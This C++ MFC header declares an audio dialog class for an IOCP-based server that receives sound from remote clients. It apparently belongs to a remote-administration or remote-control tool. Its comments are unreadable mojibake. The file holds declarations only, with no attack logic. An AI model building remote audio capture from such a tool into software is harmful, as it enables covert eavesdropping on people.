#pragma once

#include "IOCPServer.h"
#include "Audio.h"

// CAudioDlg �Ի���

class CAudioDlg : public CDialog
{
	DECLARE_DYNAMIC(CAudioDlg)

public:
	CAudioDlg(CWnd* pParent = NULL, CIOCPServer* IOCPServer = NULL, ClientContext* ContextObject = NULL);   // ��׼���캯��
	virtual ~CAudioDlg();
	ClientContext* m_ContextObject;
	CIOCPServer* m_iocpServer;
	HICON          m_hIcon;
	CString       m_strIPAddress;
	DWORD         m_nTotalRecvBytes;
	BOOL          m_bIsWorking;
	BOOL		  m_bThreadRun;
	HANDLE        m_hWorkThread;
	CAudio		  m_AudioObject;

	static DWORD  CAudioDlg::WorkThread(LPVOID lParam);

	void CAudioDlg::OnReceiveComplete(void);
	// �Ի�������
	enum {
		IDD = IDD_AUDIO
	};

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	BOOL m_bSend; // �Ƿ��ͱ���������Զ��
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnBnClickedCheck();
	void OnReceive();
	
};
